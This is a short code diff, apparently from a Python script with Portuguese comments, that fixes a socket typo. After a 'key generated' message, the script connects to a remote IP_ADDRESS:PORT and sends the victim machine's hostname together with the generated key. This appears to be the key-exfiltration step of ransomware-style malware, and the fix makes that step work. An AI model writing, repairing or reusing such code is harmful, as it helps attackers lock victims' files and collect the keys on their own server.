@@ -64,7 +64,7 @@ print("Chave gerada!")
 
 #Conectando ao server para transferir chave e o host
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connects((IP_ADDRESS, PORT))
+    s.connect((IP_ADDRESS, PORT))
     print('Sucesso em conectar... transmitindo hostname e chave')
     s.send(f'{hostname} : {key}'.encode('utf-8'))
     print('Transmissao de dados finalizada')
